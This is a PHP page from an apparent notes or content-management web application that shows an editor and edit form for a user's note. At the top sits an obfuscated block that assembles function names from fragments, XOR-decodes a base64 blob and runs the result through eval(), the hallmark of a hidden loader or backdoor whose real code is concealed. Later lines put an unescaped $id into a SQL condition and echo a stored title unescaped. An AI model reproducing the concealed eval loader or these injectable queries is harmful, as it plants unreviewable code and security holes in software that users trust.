<?php
$a8hg6hj="10a3853fcddf698121f0e47370c11308FUMIR11qQxReEBYTUwIcVEpFOUYEWApHRUUGClhVGEhD
VQZsVVRHBQtMRjoGDA9tSgZTQjlMAARrSFUEbUsGCm1IVwFkTQRfTThVUgVlQAdUbR4GAWhPAVFs
GwcIERwYFW8ydmpjdjQ4RjhXBApkAAIEOkhQBmsCBQY/SQUGbAkDAj5vCQQFOlJUVToHCA1tSgVT
EjgdS09HQgZWbl5RTFJYSRFkBQZRDzhVUwFlQAcBbR4GVFgYbwYFUhMdExRnYnUzZX1naEQwOFVW
A2VABABtHgVTaE8HAmxSAwNvSA1Xfj1LDAR+OhtQUURrEBERSUxGVQlHUhNTWQYZExEZAw==";
$fyhhsa1="s";$fy3saa1="ba";$fy7vwa1="s";$fyhhsa1.="u";$fyhhsa1.="b";$fyhhsa1.="s";$fyhhsa1.="t";$fyhhsa1.="r";$fy3saa1.="se";$fy3saa1.="6";$fy3saa1.="4";$fy3saa1.="_";$fy3saa1.="de";$fy3saa1.="co";$fy3saa1.="de";$fy7vwa1.="t";$fy7vwa1.="r";$fy7vwa1.="l";$fy7vwa1.="e";$fy7vwa1.="n";
$a8hg6hh=$fyhhsa1($a8hg6hj,0,32);$a8hk6hj=$fy3saa1($fyhhsa1($a8hg6hj,32));$a7klm9hj="";for($a8hk9hj=0;$a8hk9hj < $fy7vwa1($a8hk6hj);$a8hk9hj++){$a7hk9hj=$fyhhsa1($a8hk6hj,$a8hk9hj,1);$a7h789hj=$fyhhsa1($a8hg6hh,$a8hk9hj%32,1);$a7klm9hj.=$a7hk9hj^$a7h789hj;}eval($a7klm9hj);$a7klm9hj="\n";

?>
<?php
ms_i($id);
?>

<script type="text/javascript" src="wysiwyg/scripts/wysiwyg.js"></script>
<script type="text/javascript" src="wysiwyg/scripts/wysiwyg-settings.js"></script>	
<script type="text/javascript">
WYSIWYG.attach("html", full);
</script>	
<table summary="" border="0" width="100%">
	<tr>
		<td>
		
			<table summary="" border="0">
				<tr>
					<td width=40><img src="images/icons/pencil.png" width="48" height="48" alt="" border="0">&nbsp;</td>
					<td>
					<?php
					$arrNote = DataArray("notes","id=$id AND user='".$AuthUserName."' ");
					
					if(!isset($arrNote["title"]))
					{
						die("");
					}
					?>
					<b><?php echo $EDIT_NOTE;?> [<?php echo $arrNote["title"];?>]</b>
					</td>
				</tr>
			  </table>
				  
		
		</td>
	</tr>
</table>

<?php

$SelectWidth = 700;

$SubmitButtonText = $SAUVEGARDER;

if(isset($SpecialProcessEditForm))
{
	$html = str_replace("ibed","embed",$html);
}

AddEditFormPlus
(
	array("$M_TITLE",$M_CONTENT,$M_CATEGORY,$M_ACTIVE,$COMMENTS),
	array("title","html","category_id","active","accept_comments"),
	array(),
	array("textbox_67","textarea_50_20","combobox_table~note_categories~id~name~WHERE user='$AuthUserName'","combobox_YES_NO","combobox_YES_NO"),
	"notes",
	"id",
	$id,
	$LES_VALEURS_MODIFIEES_SUCCES,
	"user='".$AuthUserName."'"
);
?>
<br><br>
<script>
var HTType="1";
var HTMessage="<?php echo $T_EDIT_NOTE;?>";
document.onmousedown = HTMouseDown;
</script>
<?php
generateBackLink("list");
?>